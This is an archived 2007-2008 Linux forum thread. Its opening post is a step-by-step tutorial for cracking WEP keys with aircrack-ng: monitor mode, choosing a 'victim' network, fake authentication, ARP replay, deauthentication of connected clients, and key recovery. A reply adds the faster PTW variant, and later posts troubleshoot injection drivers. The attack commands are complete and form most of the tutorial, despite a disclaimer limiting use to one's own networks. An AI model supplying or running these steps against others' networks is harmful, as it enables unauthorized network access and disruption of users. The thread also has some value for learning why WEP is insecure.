---
title: "Howto: Crack WEP"
date: 2007-08-01
forum: Networking &amp; Wireless
---

### Post by XAsmodeanX on 2007-08-01
[COLOR=Blue]Posted: August 1, 2007 **** Updated: October 9, 2007[/COLOR]
[COLOR=Red] Disclaimer:  Under no circumstances should the author (XAsmodeaNX) be held 
accountable if this messes up your computer (I have to put this in here, 
but it shouldn't).  Also, cracking people's WEP keys is probably very illegal.  
YOU SHOULD DO THIS ON NETWORKS YOU OWN, AND FOR TESTING/LEARNING PURPOSES ONLY.  

[COLOR=Lime]There have been some concern that this tutorial is inappropriate.  I understand that concern, but will not remove this thread because of the following:

[/COLOR]There is nothing inherently wrong with penetration testing your own networks, and it is not illegal to possess or use any of the tools in my tutorial. 
Following the logic that some linux applications can be misused, and that they are made for linux, then linux can be misused. Of course, even though linux can be a powerful tool or a "weapon" in the hands of some, all linux discussion should not be removed simply because of the possibility of misuse. 
Providing people with the tools and knowledge to understand their own networks is a crucial step in the road to having better security. If you don't understand a problem, you can't give a solution. The more that people know and understand how the WEP encryption scheme is broken, the better they can protect themselves by using WPA or another standard that is more secure. Also, more people not endorsing WEP means that the companies that make wireless routers and modems will stop making WEP the default encryption and telecompanies like Qwest or Comcast, will train their technicians to use another protocol when installing wireless devices in the home.[/COLOR]  


[COLOR=Blue] If you have questions, post them and I'll try and help you out and revise 
this document.  Enjoy.[/COLOR]


[B][SIZE=5] BASIC WEP CRACKING TUTORIAL BY XAsmodeaNX[/SIZE]
[/B] 
Hello, this is a brief synopsis/tutorial of an arp replay/deauth attack to crack 
the key on networks that utilize WEP encryption.  The goal of this tutorial 
is to find a network, catch an ARP packet going across the network, 
re-use that ARP to try and associate with the access point thus 
generating a lot of data packets that each have an IV in them and then 
crack the WEP key.  Once we've collected enough of this IVs (Initialization 
Vectors) we can read the log file that all this information was stored in and 
use that to crack the WEP key.

Unfortunately, for right now, this tutorial assumes you have correctly 
installed the madwifi drivers for your wireless card and it is capable 
of injection.  Obviously, you should also have installed the packages 
aircrack-ng, aireplay-ng, airmon-ng, and airodump-ng.  The former will 
require some of your own research and a revision to this tutorial (future update), 
the ladder could be accomplished with something as simple as:

>          sudo apt-get install aircrack-ng aireplay-ng airmon-ng airodump-ng
Basically, this is what we'll cover:

[B] 0.0  - All Commands listed in order
1.0  - Prepping wireless card
1.1  - Picking a target by channel hopping
1.2  - Start logging the victim networks traffic
1.3a - Try to associate with the access point and capture an ARP request 
       from an already connected client to replay and generate IVs
1.3b - If 1.2a fails, use a "deauth" attack to force and ARP packet to 
       be sent
1.4  - Gather enough IVs and crack the WEP key
1.5  - Conclusion[/B]

[COLOR=Red]** ****NOTE******
Before we begin, when entering the commands be sure to replace 
"AP:MA:CA:DD:RE:SS" with the access point mac address, "CL:IE:NT:MA:CA:DS" 
with the client that is connected to the access point your attacking (NOT YOUR
OWN MAC ADDRESS), and "ESSID" with the essid of the network your attacking.  Also 
when a command calls to specify a channel, make sure you name the correct one.[/COLOR]

[SIZE=4][B] [0.0] Quick Command Reference
[/B][/SIZE] 
This is put in here so if you need to come back later you can just look 
at the commands rather than reading through this tutorial again and 
picking them out.

>          sudo airmon-ng stop ath0
        sudo airmon-ng start wifi0
        sudo airodump-ng ath1
        airodump-ng -c 11 --bssid AP:MA:CA:DD:RE:SS -w dump ath1
        sudo aireplay-ng --fakeauth 0 -e "ESSID" -a AP:MA:CA:DD:RE:SS -h CL:IE:NT:MA:CA:DS ath1
        sudo aireplay-ng --arpreplay -b AP:MA:CA:DD:RE:SS -h CL:IE:NT:MA:CA:DS ath1
        sudo aireplay-ng --deauth 5 -a AP:MA:CA:DD:RE:SS -c CL:IE:NT:MA:CA:DS ath1
        sudo aircrack-ng -a 1 -f 10 dump*.cap[SIZE=4]** [1.0] Prepping Wireless Card**[/SIZE]

First, you'll need to start by bringing up the card in monitor mode:

>          sudo airmon-ng stop ath0
        sudo airmon-ng start wifi0[SIZE=4][B] [1.1] Picking a Target
[/B][/SIZE] 
Once that's done, you'll need to pick your target.

>          sudo airodump-ng ath1Be sure to pick a target that has good power and has clients associated 
to it.  Make note of the channel that it's on.  Once you've decided on a 
suitable victim:

>          ctrl^c (quit the program; the channel hopping may screw us up)
[SIZE=4]** [1.2] Start Logging Software**[/SIZE]

Start the logging software to monitor the network's traffic and capture 
IVs.

>          airodump-ng -c 11 --bssid AP:MA:CA:DD:RE:SS -w dump ath1[SIZE=4]** [1.3a] Attempt To Capture an ARP Request and Replay It**[/SIZE]

Next, in this case, we'll look for an arp request and if we capture one, 
we'll replay it and log a whole bunch of IVs.

>          sudo aireplay-ng --fakeauth 0 -e "ESSID" -a AP:MA:CA:DD:RE:SS -h CL:IE:NT:MA:CA:DS ath1
        sudo aireplay-ng --arpreplay -b AP:MA:CA:DD:RE:SS -h CL:IE:NT:MA:CA:DS ath1[COLOR=Red] At this point, you can either wait to capture an ARP request and if you 
do, it will replay that packet while simultaneously logging the IVs 
(good news, gather 250k-500k IVs and then crack the logfiles) or you can 
use a de-authorization attack to disassociate the client from the access 
point and hopefully capture an ARP request when it tries to reconnect.[/COLOR]

[SIZE=4]** [1.3b] Plan B - Force an ARP Request By Deauth Attack**[/SIZE]

To use a De-Authorization attack if you can't just outright capture an 
ARP packet "in the wild":

>          sudo aireplay-ng --deauth 5 -a AP:MA:CA:DD:RE:SS -c CL:IE:NT:MA:CA:DS ath1This attack should force an ARP packet to be sent which will be 
intercepted by the software we have running that monitors and logs all 
activities on the victim network.  

[SIZE=4][B] [1.4] Finally!  Cracking The WEP Key
[/B][/SIZE] 
Collect about 250k-500k packets to get enough IVs to find they WEP key.

>          sudo aircrack-ng -a 1 -f 10 dump*.capIf you can't find the key, play around with the aircrack-ng options a 
little to fine tune it to the logfiles you've collected.  Eg:

>          man aircrack-ng[SIZE=4]** [1.5] Closing Words**[/SIZE]

Happy cracking!  Please post questions/problems and I'll help you
as best as I can.  Remember this is an ever-changing document because 
of updates.

Authored by: XAsmodeaNX
References: Myself.

---

### Post by XAsmodeanX on 2007-08-01
Update:  Quick cosmetic changes.
Update: Addition to disclaimer 

I will rewrite this tutorial and keep the old one to update newer programs and methods as soon as I can.  Thank you everyone who posted helpful information.  I wrote this tutorial right before I started college and I've been very busy unfortunately.  I have a holiday coming up soon and I'm excited to get to work on this because so many people are enthusiastic about learning it.

---

### Post by tturrisi on 2007-08-01
fyi - no need for naming individual apps in the apt install, all that is needed is:
apt-get install aircrack-ng
(those other apps listed above are already included in the aircrack-ng package.  Also, the latest aircrack-ng contains aircrack-ptw as well, which greatly speeds up wep cracking by about 250-500%.  [13 may 2007	Aircrack-ng 0.9 is released. The main change is the addition of PTW attack (beside usual fixes and improvements  [http://www.aircrack-ng.org/doku.php?id=morenews](http://www.aircrack-ng.org/doku.php?id=morenews)) ]

using aircrack-ptw:

```

terminal #1
airmon-ng stop ath0
airmon-ng start wifi0 11  #where 11 = desired channel
ifconfig athX up  #where X = number as result of previous step
aireplay-ng -1 0 -e WLAN -a 00:00:00:00:00:00 -h 11:11:11:11:11:11 athX  #where WLAN = ap ssid, where -a 00:00:00:00:00:00 = mac address of ap, where -h 11:11:11:11:11:11 = mac addresss of your adapter, where X = athX used in previous step

terminal #2
airodump-ng -c 11 --bssid  00:00:00:00:00:00 -w output athX  #where --bssid  00:00:00:00:00:00 = mac address of ap, where X = athX used previously

terminal #3 (injection)
aircrack-ng -b  00:00:00:00:00:00 output*.ivs  #where -b 00:00:00:00:00:00 = mac address of ap

terminal #4  (need approx 10-50k ivs for 64 bit wep
use aircrack-ptw output-01.cap
```

more info on aircrack-ptw here:
[http://www.wirelessdefence.org/Contents/Aircrack-ptw.htm](http://www.wirelessdefence.org/Contents/Aircrack-ptw.htm)

screenshot of aircrack-ptw:

---

### Post by XAsmodeanX on 2007-08-01
Okay, thanks.  I'll take a look into that and update the first post accordingly.

---

### Post by tturrisi on 2007-08-01
another fyi:

There's a "bug" in udev where the madwifi device (athX) stack up (increase in name from ath0 > ath1 > ath2 when using aircrack-ng.

This line in /etc/udev/persistent-net-generator.rules
# ignore "secondary" raw interfaces of the madwifi driver
KERNEL=="ath*", ATTRS{type}=="802",	GOTO="persistent_net_generator_end"

causes multiple athX devices to be listed in this file:
/etc/udev/rules.d/z25_persistent-net.rules
(you'll see multiple athX devices there.

To fix this so the device name ath0 is ALWAYS used in future uses of aircrack-ng change the line in
/etc/udev/persistent-net-generator.rules
to:
# ignore "secondary" raw interfaces of the madwifi driver
KERNEL=="ath*", 	GOTO="persistent_net_generator_end"

and delete all athX devices in:
/etc/udev/rules.d/z25_persistent-net.rules

You can observe this phenomona when using airmon-ng:
airmon-ng start wifi0 11  #where 11 = desired channel
will show ath1 instead of ath0 and the next time you use airmon-ng it will show ath2, and so on until someday you are using ath677!

---

### Post by limefire on 2007-08-01
Web crack wont work on windows and may contain Spyware.
Never  download any software until toy are familiar with the OS.

Limefire:(

---

### Post by Kasle on 2007-08-02
hi! I've got a problem: i don't find the client MAC adress... can anyone please help me?

---

### Post by tturrisi on 2007-08-02
> **limefire said:**
> Web crack wont work on windows and may contain Spyware.
Never  download any software until toy are familiar with the OS.

Limefire:(
What are you talking about?
There's no spyware in aircrack-ng Windows version!
The Windows version of aircrack-ng works fine & cracks WEP very well.  It's painfully slow because packet injection does not work in Windows, so it takes a loooong time to grab enough iv's, or you must craft your own packet & inject it using a separate utility.  Also, to use aircrack-ng in Windows you need an adapter & a 3rd party driver that can put the device into monitor mode.  Native Windows drivers do not support monitor mode.  RTFM!

---

### Post by kevdog on 2007-08-02
Hmm, seems like this info is hitting the mainstream:

[http://www.smallnetbuilder.com/content/view/30114/98/](http://www.smallnetbuilder.com/content/view/30114/98/)

---

### Post by punkrokk on 2007-08-08
not bad, if you want to crack it faster try aircrack-ptw

Update: sorry, didn't see the note at the bottom of the author's post

---

### Post by wifi-staff on 2007-08-13
Can I post link for extended tutorial here or to new topic?

---

### Post by rne1223 on 2007-08-22
Ok...I try the first step and this is what it showed me 


```
rne1223@rne1223-laptop:~$ sudo airmon-ng start wifi0


Interface       Chipset         Driver

eth1            Centrino b/g    ipw3945


```


I tried to fallow the other steps but it says something about "ath0"

```
rne1223@rne1223-laptop:~$ sudo airodump-ng ath1
ath1 is not a network interface.

```

I replace the ath1 with eth1 but I lose connection.

What am I suppose to do? How do I fix this? I think that I have to install a patch but I don't know which one or how to installed. Don't get me wrong, it is not like I haven't try to find an answer for myself but the more I read...the more I get confuse. I was wandering if anyone could please break it down nice and slow for me because I really want to learn how to use aircrack-ng. Thanks

---

### Post by wieman01 on 2007-08-22
> **rne1223 said:**
> Ok...I try the first step and this is what it showed me 


```
rne1223@rne1223-laptop:~$ sudo airmon-ng start wifi0


Interface       Chipset         Driver

eth1            Centrino b/g    ipw3945


```


I tried to fallow the other steps but it says something about "ath0"

```
rne1223@rne1223-laptop:~$ sudo airodump-ng ath1
ath1 is not a network interface.

```

I replace the ath1 with eth1 but I lose connection.

What am I suppose to do? How do I fix this? I think that I have to install a patch but I don't know which one or how to installed. Don't get me wrong, it is not like I haven't try to find an answer for myself but the more I read...the more I get confuse. I was wandering if anyone could please break it down nice and slow for me because I really want to learn how to use aircrack-ng. Thanks
First thing you ought to find it is whether your wireless adapter (IPW3945) supports packet re-injection at all. If not, then there is no use in following this HOWTO. Afaik, IPW3945 does not support it.

Google for "IPW3945 packet reinjection"...

---

### Post by rne1223 on 2007-08-22
I looked and it appears that yes....that I will be able to inject. I just don't know how to install the patch to be able to inject. Any ideas?

---

### Post by wieman01 on 2007-08-22
> **rne1223 said:**
> I looked and it appears that yes....that I will be able to inject. I just don't know how to install the patch to be able to inject. Any ideas?
No idea at all. If there is mention of packet reinjection on the web, there should be some websites explaining how to patch the driver, no?

But it might well be that you can inject right away. My IPW2200 could inject out of the box, which took me by surprise. Have you tried following this HOWTO or mine (signature) yet? Perhaps it works without you having to install the patch.

---

### Post by rne1223 on 2007-08-22
I found a website with the patch:
[http://homepages.tu-darmstadt.de/~p_larbig/wlan/](http://homepages.tu-darmstadt.de/~p_larbig/wlan/)

It is called "ipwraw-ng-2.0.0-10072007.tar.bz2"


However the instructions are kinda funky...

```
The following provides steps that can be used to manually install and 

load the driver.  

Lines beginning with % can be run as any user.  Lines beginning with # 
must be run as root.

First we install the firmware files (first finding where to install 
them):

	% wget http://bughost.org/ipw3945/ucode/iwlwifi-ucode-2.14.1.tgz .
	% DIR=$(sed -ne "s:^FIRMWARE_DIR=\([^, ]*\).*:\1:p" \
		/etc/hotplug/firmware.agent)
	% tar xzvf iwlwifi-ucode-2.14.1.tgz 
	% less iwlwifi-ucode-2.14.1/LICENSE.iwlwifi-ucode
	# cp ipwlwifi-ucode-2.14.1/iwlwifi-3945.ucode $DIR

NOTE:  'DIR' above typically works out to /lib/firmware.

Next you can build the driver sources:

	% make

assuming no errors are reported, you can then install the module into 
your system:

	# make install <-- You need to be root

And now we can try to load the module:

	# ./load 6 

You can then use tcpdump, tethereal, or any sniffer software to bind to
the rtap% interface for Radiotap formatted packets, or to the wifi% 
interface for raw 802.11 packets.

You can tune to a new channel via the set_channel script:

	# ./set_channel 11

See util/wifi_tx for a sample utility to transmit 802.11 frames.

```

I tried to fallow this instructions but I run into to problems in the second step:

```
rne1223@rne1223-laptop:~$ DIR=$(sed -ne "s:^FIRMWARE_DIR=\([^, ]*\).*:\1:p" \
> 
aircrack-ng-0.9.1/
aircrack-ng-0.9.1.tar.gz
.awn/
.bash_history
.bash_logout
.bashrc
.bluefish/
botlib.log
building_applications_with_jbuilder.pdf
CF_Installer-Updater_v.2_rev.1.sh
.compizconfig/
.config/
.DCOPserver_rne1223-laptop__0
.DCOPserver_rne1223-laptop_:0
Desktop/
.dmrc
dump-01.cap
dump-01.txt
dump-02.cap
dump-02.txt
dump-03.cap
dump-03.txt
.dvdcss/
> t)
sed: can't read t: No such file or directory
rne1223@rne1223-laptop:~$ 

```

It looks like I don't have a sed file in my home directory, but am I suppose to create one?...:confused::(...I'm so confuse...You probably have notice by now but I'm a newbie who doesn't know how to speak English well...:)

Thanks for all the help.

---

### Post by wieman01 on 2007-08-22
Nonesense... Deleted!

---

### Post by rne1223 on 2007-08-22
I'm getting stuck in the  "cp ipwlwifi-ucode-2.14.1/iwlwifi-3945.ucode /lib/firmware" part. The error says that:

```
 Not pattern found

```

Maybe this happen because it can't find the lib firmware directory....maybe the second piece of code "DIR=$(sed -ne "s:^FIRMWARE_DIR=\([^, ]*\).*:\1:p" \
		/etc/hotplug/firmware.agent)"...is what makes the directory but I  don't really know.

---

### Post by wieman01 on 2007-08-22
> **rne1223 said:**
> I'm getting stuck in the  "cp ipwlwifi-ucode-2.14.1/iwlwifi-3945.ucode /lib/firmware" part. The error says that:

```
 Not pattern found

```

Maybe this happen because it can't find the lib firmware directory....maybe the second piece of code "DIR=$(sed -ne "s:^FIRMWARE_DIR=\([^, ]*\).*:\1:p" \
		/etc/hotplug/firmware.agent)"...is what makes the directory but I  don't really know.
Let me check this out. I tried on my own computer just now and something seems wrong with these instructions...

---

### Post by wieman01 on 2007-08-22
Ah, I dunno. We got to find something else. I'll check tomorrow and will see if I find something appropriate. Will report back to you. :-)

---

### Post by rne1223 on 2007-08-22
For those, newbies like me, who are having trouble installing the patch for injection with ipw3945...I found this other site...it seems to be easier, but I don't know if it works since I don't have my computer with me. Please try it out and report back...Thanks

[http://forums.remote-exploit.org/archive/index.php/t-7260.html](http://forums.remote-exploit.org/archive/index.php/t-7260.html)

Ps...I know I'm posting in the wrong thread but o'well :lolflag:


Edit...I tried it but looks like to be for BackTrack 2 and not Ubuntu :confused:

---

### Post by Phoenixzeus on 2008-03-20
For the record the latest version of Aircrack-ng has modifications to the standard ipw2200 wireless adaptor built in (in most cases)

---

### Post by deltaprime on 2008-03-20
First of all thanks for another GOOD tutorial
But
 you guys should stop creating these tutorials if anyone needs help with that there are millions available on remote exploit forums but there are simply tooo many... get my point
and after all its not hard its probably one of the easy things if any one needs help with specific steps we should help them instead of creating a whole tuto with ALL the steps 

dont you think,
maybe im wrong - then get me right

thanks 


ps not meant to hurt feeliings ;)

---

### Post by deltaprime on 2008-03-20
> **rne1223 said:**
> For those, newbies like me, who are having trouble installing the patch for injection with ipw3945...I found this other site...it seems to be easier, but I don't know if it works since I don't have my computer with me. Please try it out and report back...Thanks

[http://forums.remote-exploit.org/archive/index.php/t-7260.html](http://forums.remote-exploit.org/archive/index.php/t-7260.html)

Ps...I know I'm posting in the wrong thread but o'well :lolflag:


Edit...I tried it but looks like to be for BackTrack 2 and not Ubuntu :confused:

Remote exploit forums is the best all we do there is wireless security and pentesting, wardriving and creating new stuff so please come check it out if you need REAL help with this

---

### Post by wieman01 on 2008-03-20
> **deltaprime said:**
> First of all thanks for another GOOD tutorial
But
 you guys should stop creating these tutorials if anyone needs help with that there are millions available on remote exploit forums but there are simply tooo many... get my point
and after all its not hard its probably one of the easy things if any one needs help with specific steps we should help them instead of creating a whole tuto with ALL the steps 

dont you think,
maybe im wrong - then get me right

thanks 


ps not meant to hurt feeliings ;)
No feeling hurt, but your advice does not really help either. Understand that "remote exploit forums" are the best for this kind of stuff, but so what? If these tutorials help people, so be it. In fact I think Aircrack's own website is the best source you can get. Of course not meaning to hurt any feelings here.

---

### Post by deltaprime on 2008-03-22
> **wieman01 said:**
> No feeling hurt, but your advice does not really help either. Understand that "remote exploit forums" are the best for this kind of stuff, but so what? If these tutorials help people, so be it. In fact I think Aircrack's own website is the best source you can get. Of course not meaning to hurt any feelings here.

got a good point bud!

---

### Post by Jason2gs on 2008-04-03
So this will only work for people with Atheros wireless cards?

Unless I'm mistaken, Madwifi won't play nice with Broadcom chipsets, correct?

---

### Post by chilskater on 2008-04-10
bro,
i have SENAO USB 5 dBi antenna..my ndiswrapper is working..shud i get madwifi instead?i noobie

---

### Post by Scorpion1031 on 2008-04-10
> **Jason2gs said:**
> So this will only work for people with Atheros wireless cards?

Unless I'm mistaken, Madwifi won't play nice with Broadcom chipsets, correct?

No it will work with most cards as long as they can be set to rfmon or Monitor mode.  Many cards must be patched in order for packet injection to be used.  I use a Ralink rt73 and my card works just fine.  Atheros, however, seems to be the easiest to use.

---

### Post by Junglizer on 2008-04-10
Yes, Atheros chips usually are the easiest to work with, shoot for something with the AR5212 or AR5213 chipset out of the 5004 family.

---

### Post by openflame06 on 2008-04-26
Im running kubuntu on a toshiba satellite A100 a LOT of these machines and a fair few by acer have the Atheros card.

I've used it for WPA/PSK cracking and it was fine. This tutorial looks good so when I find a WEP point I will give it a try.

---

### Post by giruzz on 2008-04-26
Hi All,

I'm having a really strange problem with my card. While I was using ubuntu 7.10 I was able to use aircrak-ng and airodump-ng...but now after upgrading to Ubuntu 8.04 I can't use airodump-ng.

I'm using a patched version of madwifi 0.9.4, I can put the card on monitor mode (at least is what iwconfig says) but when I try to use airodump I'm unable to see any wifi lan (including my router that is sitting about 1mt from my laptop). 

What am I doing wrong?

thank you
g.

---

